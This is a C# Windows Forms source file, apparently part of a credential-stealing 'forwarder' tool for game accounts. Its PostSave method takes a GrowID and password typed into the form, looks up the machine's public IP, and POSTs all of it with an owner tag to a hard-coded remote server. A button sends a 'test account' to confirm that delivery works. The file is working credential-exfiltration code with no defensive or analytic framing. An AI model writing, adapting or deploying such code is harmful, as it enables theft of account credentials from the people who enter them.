using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace PallemyForwarder
{
    public partial class Custom : MaterialSkin.Controls.MaterialForm
    {
        public static string usr = "";
        public Custom()
        {
            InitializeComponent();
            var skinManager = MaterialSkin.MaterialSkinManager.Instance;
            SkinManager.AddFormToManage(this);
            SkinManager.Theme = MaterialSkin.MaterialSkinManager.Themes.DARK;
            SkinManager.ColorScheme = new MaterialSkin.ColorScheme
                (MaterialSkin.Primary.Orange600, MaterialSkin.Primary.Orange800, MaterialSkin.Primary.Orange900,
                MaterialSkin.Accent.Orange100,
                MaterialSkin.TextShade.WHITE

                );
        }
        public static string PostSave(string growid, string password, string owner)
        {
            Random generator = new Random();
            int r = generator.Next(100000, 1000000);
            string url = "http://45.155.124.146/S4UCKSMYLIFE/postdata.php";
            string ip = new WebClient().DownloadString("http://icanhazip.com");
            ip = ip.Substring(0, ip.Length - 1);
            var time = DateTime.Now.ToFileTime();
            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
            request.Method = "POST";
            request.ContentType = "application/x-www-form-urlencoded";
            string data = "id=" + r + "&growid=" + HttpUtility.UrlEncode(growid) + "&password=" + HttpUtility.UrlEncode(password) + "&ip=" + ip + "&computer=" + "baran" + "&owner=" + usr;
            request.ContentLength = data.Length;
            StreamWriter writer = new StreamWriter(request.GetRequestStream(), Encoding.ASCII);
            writer.Write(data);
            writer.Flush();
            HttpWebResponse response = (HttpWebResponse)request.GetResponse();
            string encoding = response.ContentEncoding;
            if (encoding == null || encoding.Length < 1)
            {
                encoding = "UTF-8";
            }
            StreamReader reader = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(encoding));
            data = reader.ReadToEnd();
            response.Close();
            return data;
        }
        private void materialRaisedButton2_Click(object sender, EventArgs e)
        {
            string xd = PostSave(u.Text, p.Text, usr);
            if (xd == "OK")
            {
                MessageBox.Show("A test account has been successfully sent.", "Pallemy Forwarder", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
        }

        private void Custom_Load(object sender, EventArgs e)
        {

        }
    }
}
